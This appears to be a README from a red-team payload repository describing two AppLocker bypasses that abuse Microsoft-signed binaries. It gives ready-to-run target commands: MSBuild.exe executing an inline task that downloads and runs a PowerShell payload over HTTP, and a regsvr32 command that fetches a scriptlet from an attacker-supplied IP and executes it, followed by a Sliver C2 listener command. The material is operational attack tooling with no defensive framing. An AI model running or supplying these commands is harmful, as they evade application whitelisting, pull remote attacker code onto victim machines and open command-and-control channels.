# AppLocker Bypass Payloads

AppLocker bypasses beyond the InstallUtil chain in `../word-macro/installutil-applocker-bypass/`.

| File | Technique |
|---|---|
| `msbuild-shellcode.xml` | `msbuild.exe` inline-task (`CodeTaskFactory`) — executes C# / PowerShell without a blocked EXE |
| `regsvr32.sct` | `regsvr32.exe` scriptlet (.sct) — executes JScript via `scrobj.dll` |

Both rely on Microsoft-signed LOLBins that are typically allowed by AppLocker
when only user-writable paths are blocked.

---

## msbuild inline task

```bash
# Host the xml + payload, then run on target:
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\MSBuild.exe msbuild-shellcode.xml
```

The inline task downloads and runs a PowerShell payload over HTTP. Edit the URL
inside `msbuild-shellcode.xml` first.

## regsvr32 scriptlet

```bash
# Host the .sct on your HTTP server, then run on target:
regsvr32.exe /s /n /u /i:http://<IP>/regsvr32.sct scrobj.dll
```

Edit the PowerShell command inside `regsvr32.sct` first.

---

## Listener

```bash
sliver > mtls --lhost <IP> --lport 443
```
